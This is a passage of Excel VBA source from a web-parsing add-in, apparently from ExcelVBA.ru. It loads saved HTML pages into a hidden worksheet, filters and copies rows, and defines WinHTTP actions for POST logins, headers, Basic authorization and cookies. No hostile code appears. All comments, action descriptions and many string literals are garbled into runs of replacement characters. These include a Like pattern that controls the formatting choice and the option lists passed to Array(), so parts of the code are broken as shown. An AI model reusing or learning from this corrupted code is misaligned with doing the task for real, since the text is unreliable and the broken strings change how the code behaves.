    Set ts = FSO.CreateTextFile(FileName$, True, True)
    ts.Write PageText$: ts.Close
    Set ts = Nothing: Set FSO = Nothing

    Set sh = GetWebQueryWorksheet
    sh.UsedRange.EntireRow.Delete

    ConnectionString$ = "URL;file:///" & Replace(FileName$, " ", "%20")
    With sh.QueryTables.Add(ConnectionString$, sh.Range("a1"))
        .RefreshStyle = xlInsertDeleteCells
        .AdjustColumnWidth = True

        If Len(Trim(WebTables$)) Then
            .WebSelectionType = xlSpecifiedTables
            .WebTables = Trim(WebTables$)
        End If

        If WebFormatting$ Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*" Then
            .WebFormatting = xlWebFormattingAll
        Else
            .WebFormatting = xlWebFormattingNone
        End If

        .WebPreFormattedTextToColumns = True
        .WebConsecutiveDelimitersAsOne = True
        .WebSingleBlockTextImport = False
        .WebDisableDateRecognition = True
        .WebDisableRedirections = True
        .Refresh BackgroundQuery:=False
        .Delete
    End With

    With sh.UsedRange
        .UnMerge
        .Borders.LineStyle = xlLineStyleNone
        .EntireColumn.AutoFit
    End With

    sh.Parent.Saved = True
End Sub

Function GetWebQueryWorksheet() As Worksheet
    On Error Resume Next
    Dim WB As Workbook
    Set WB = Workbooks(WEB_QUERY_WORKBOOK_NAME$)
    If WB Is Nothing Then
        Set WB = Workbooks.Add(xlWBATWorksheet)
        WB.IsAddin = True
        WB.Worksheets(1).Name = "WEB_QUERY"
        Kill FWF.temp_folder & WEB_QUERY_WORKBOOK_NAME$
        WB.SaveAs FWF.temp_folder & WEB_QUERY_WORKBOOK_NAME$
    End If
    Set GetWebQueryWorksheet = WB.Worksheets(1)
End Function

Sub Toggle_ShowWebQuerySheet()
    On Error Resume Next
    With GetWebQueryWorksheet.Parent
        .IsAddin = Not .IsAddin
        If Not .IsAddin Then .Windows(1).ScrollRow = 1
        .Saved = True
    End With
End Sub

Sub Action_TableToSheet(ByVal Filters$, ByVal ColumnsOrder$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' Filters$ - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| "1=?*&&3=##*"
    ' ColumnsOrder$ - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, "1-5, 7, 9"
    On Error Resume Next
    Dim sh As Worksheet, ColumnsAddress$, FilteredRows As Range, RO As Range

    Set sh = GetWebQueryWorksheet

    If Len(ColumnsOrder$) > 0 Then ColumnsAddress$ = ColumnsStringToRangeAddress(ColumnsOrder$)
    If Len(ColumnsAddress$) = 0 Then ColumnsAddress$ = sh.UsedRange.EntireColumn.Address

    If Filters$ Like "*#=*" Then
        For Each RO In sh.UsedRange.EntireRow
            If CheckFiltersForRow(RO, Filters$) Then
                If FilteredRows Is Nothing Then Set FilteredRows = RO Else Set FilteredRows = Union(FilteredRows, RO)
            End If
        Next
    Else
        Set FilteredRows = sh.UsedRange.EntireRow
    End If

    If FilteredRows Is Nothing Then Exit Sub        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    Dim shd As Worksheet, LastRowColumn&, destCell As Range
    If RunningParser Is Nothing Then
        Set shd = Workbooks.Add.Worksheets(1)
        LastRowColumn& = 1
    Else
        Set shd = RunningParser.Sheet
        LastRowColumn& = RunningParser.Columns.SheetOptions.BaseColumn
    End If
    Set destCell = shd.Cells(shd.Rows.Count, LastRowColumn&).End(xlUp).Offset(1)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
    Err.Clear
    'Debug.Print "FilteredRows", FilteredRows.Address
    'Debug.Print "sh.Range(ColumnsAddress$)", sh.Range(ColumnsAddress$).Address

    Intersect(FilteredRows, sh.Range(ColumnsAddress$).EntireColumn).Copy
    destCell.PasteSpecial
    Application.CutCopyMode = False

    shd.Parent.Windows(1).ScrollRow = shd.Cells(shd.Rows.Count, LastRowColumn&).End(xlUp).row - 10
    shd.Cells(shd.Rows.Count, LastRowColumn&).End(xlUp).Offset(1).Select
    Application.ScreenUpdating = True: Application.ScreenUpdating = False

    '    Debug.Print Err.Number, Err.Description
    '    Debug.Print Intersect(FilteredRows, sh.Range(ColumnsAddress$).EntireColumn).Address

    If RunningParser Is Nothing Then shd.Parent.Saved = True
End Sub

Function CheckFiltersForRow(ByRef RO As Range, ByVal Filters$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ro |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|detn |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| filters$
    ' Filters$ - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| "1=?*&&3=##*"
    On Error Resume Next
    CheckFiltersForRow = True

    Dim arr, i&, filter$, col&, cond As Boolean
    arr = Split(Filters$, "&&")

    For i = LBound(arr) To UBound(arr)
        col& = Val(Split(arr(i), "=")(0))
        filter$ = Split(arr(i), "=", 2)(1)
        If col& Then
            cond = RO.Cells(col&).value Like filter$
            CheckFiltersForRow = CheckFiltersForRow And cond
            If Not cond Then Exit Function
        End If
    Next i
End Function

Attribute VB_Name = "mod_AAs_WinHTTP"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_WinHTTP                    Version:
' Author        : Igor Vakhnenko                   Date: 18.05.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Private Module: Option Compare Text

Sub InitializeActions_WinHTTP(ByRef AAs As ArrayActions)
    With AAs.AddAction(fc_WinHTTP, "POST_Auth", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (POST-|fffd||fffd||fffd||fffd||fffd||fffd|)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTPRequest (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "2) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies)" & vbNewLine & _
                       "3) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| POST)" & vbNewLine & _
                       "4) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (8-10 |fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "5) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies)" & vbNewLine & _
                       "6) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|+|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|R+catalog.html|fffd| |fffd||fffd||fffd| |fffd|R-LoginErrorPage|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookie, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|C+user|fffd|, " & _
                       "|fffd||fffd||fffd| user - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookie |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

        .AddParameter "URL", aps_Text, "URL |fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "POST", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| name=vasya&pwd=1234)"
        .AddParameter "CheckCommand", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "LoadFrontPageWhenDone", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FrontPage |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
        .AddParameter "FormURL", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL (|fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "FormFilter", aps_Text, "HTML |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_POST", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (Host, Origin, User-Agent |fffd| |fffd|.|fffd|.) + " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = |fffd||fffd|." & vbNewLine & _
                       "POST-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| name=vasya&pwd=1234 |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd| |fffd||fffd||fffd||fffd| {""action"":""Index"",""type"":""rpc"",""tid"":2}" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST, " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 30 |fffd||fffd||fffd||fffd||fffd||fffd|)"

        .AddParameter "URL", aps_Text, "URL |fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "POST", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| name=vasya&pwd=1234)"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip"), ""
        .AddParameter "CacheMode", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_Open", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - 30 |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Method", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (GET |fffd||fffd||fffd| POST)", Array("GET", "POST", "PUT", "DELETE", "OPTION"), "GET"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_AddPOSTdata", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("UrlEncode", "Windows-1251"), "UrlEncode"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_AddPOSTdata2", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "POST-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| name=vasya&pwd=1234 |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd| |fffd||fffd||fffd||fffd| {""action"":""Index"",""type"":""rpc"",""tid"":2}"
        .AddParameter "POST", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| name=vasya&pwd=1234)"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_setRequestHeader", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Global", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_BasicAuthorization", "Basic Authorization")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Basic Authorization" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Basic |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (Base64 |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd|:|fffd||fffd||fffd||fffd||fffd||fffd|')" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (get string), " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| (set header), |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (set global header)"
        .AddParameter "Login", aps_Text, "|fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Password", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("get string", "set header", "set global header"), "set global header"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_AddCookie", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookie")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookie"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WinHTTP, "WinHTTP_Send_getResponse", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")        ' new
